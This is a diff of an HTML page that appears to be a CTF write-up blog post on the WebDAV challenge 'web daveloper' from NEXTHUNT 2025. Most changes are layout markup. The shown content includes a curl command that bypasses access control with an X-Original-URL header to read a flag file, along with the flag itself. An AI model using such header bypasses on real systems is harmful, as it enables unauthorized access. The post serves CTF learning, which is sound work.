@@ -3,16 +3,21 @@
 <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
 <title>web daveloper - 0xsila</title>
 <meta name="description" content="WebDAV: method override, PROPFIND enumeration and a header bypass.">
-<meta name="color-scheme" content="light dark">
+<meta name="color-scheme" content="dark light">
 <link rel="icon" href="../assets/img/favicon.svg" type="image/svg+xml">
 <link rel="stylesheet" href="../assets/css/style.css">
 </head><body><div class="wrap">
-<header class="top"><a href="../index.html"><b>0xsila</b></a>
-<nav><a href="../index.html#writeups">writeups</a><a href="../index.html#reports">reports</a><a href="../index.html#certifications">certifications</a><a href="../index.html#contact">contact</a></nav></header>
-<p><a href="../index.html#writeups">&larr; writeups</a></p>
+<header class="top">
+<a class="brand" href="../index.html"><span class="mono-mark">0x</span>sila</a>
+<nav><a href="../index.html#writeups">writeups</a><a href="../index.html#reports">reports</a><a href="../index.html#certifications">certifications</a><a href="../index.html#contact">contact</a></nav>
+</header>
+<article class="post">
+<p><a class="back" href="../index.html#writeups">&larr; writeups</a></p>
+<p class="kicker">CTF writeup &middot; NEXTHUNT 2025 &middot; 2 min read</p>
 <h1>web daveloper</h1>
-<p class="meta">CTF challenge writeup &middot; NEXTHUNT 2025 &middot; author: 0xsila</p>
-<article class="prose"><h2>Challenge Name</h2>
+<p class="lede">WebDAV: method override, PROPFIND enumeration and a header bypass.</p>
+<p class="tags"><span class="tag">webdav</span><span class="tag">method-override</span></p>
+<div class="prose"><h2>Challenge Name</h2>
 <p><strong>web daveloper</strong></p>
 <h2>Challenge Description</h2>
 <p>i am just a web daveloper, using copilot and chatgbt to create challenges :(<br />
@@ -45,8 +50,9 @@ NOTE: brute forcing is not allowed, you'll be blocked immediatly.</p>
 <p>final exploit :</p>
 <pre><code class="language-bash">curl -H &quot;X-Original-URL: /vault/flag.txt&quot; http://ctf.nexus-security.club:3555/blablabla
 </code></pre>
-<p><strong>Flag:</strong> <code>nexus{w3bd4v_wchw3y4_h3d34rs_ezzzzzzzzz}</code></p></article>
+<p><strong>Flag:</strong> <code>nexus{w3bd4v_wchw3y4_h3d34rs_ezzzzzzzzz}</code></p></div>
 
-<p><a href="https://github.com/0xsila/nexus-nexthunt-ctf-2025-challenges/tree/main/web_daveloper">Challenge source on GitHub</a></p>
-<div class="pn"><a href="gofrita.html">previous: gofrita</a><a href="nextrace-2025.html">next: NEXTRACE 2025: the six web challenges</a></div>
-<div class="foot">Sila Yahia &middot; 0xsila &middot; <a href="mailto:silayahia7@gmail.com">silayahia7@gmail.com</a></div></div></body></html>
+<p><a href="https://github.com/0xsila/nexus-nexthunt-ctf-2025-challenges/tree/main/web_daveloper">Challenge source on GitHub &rarr;</a></p>
+</article>
+<div class="pn"><a class="pn-link" href="gofrita.html"><span class="mute">previous</span><br>gofrita</a><a class="pn-link" href="nextrace-2025.html"><span class="mute">next</span><br>NEXTRACE 2025: the six web challenges</a></div>
+<footer class="foot"><span>Sila Yahia &middot; 0xsila</span><span><a href="mailto:silayahia7@gmail.com">silayahia7@gmail.com</a></span></footer></div></body></html>
